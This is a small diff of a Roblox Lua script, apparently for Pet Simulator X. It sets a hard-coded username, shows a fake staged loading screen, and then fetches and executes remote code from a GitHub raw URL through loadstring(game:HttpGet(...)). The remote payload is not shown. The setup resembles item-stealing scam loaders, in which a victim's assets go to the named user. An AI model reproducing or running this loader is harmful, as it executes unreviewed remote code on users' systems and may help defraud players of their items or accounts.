@@ -1,15 +1,8 @@
 Username = "Murdyoof"
-
 loadingscreen = true
-
 _G.CustomScriptName = "PSX"
-
 _G.Text1 = "Preparing Script..."
-
 _G.Text2 = "Loading Script..."
-
 _G.Text3 = "Finishing Things Up..."
-
 _G.Text4 = "Almost Done..."
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
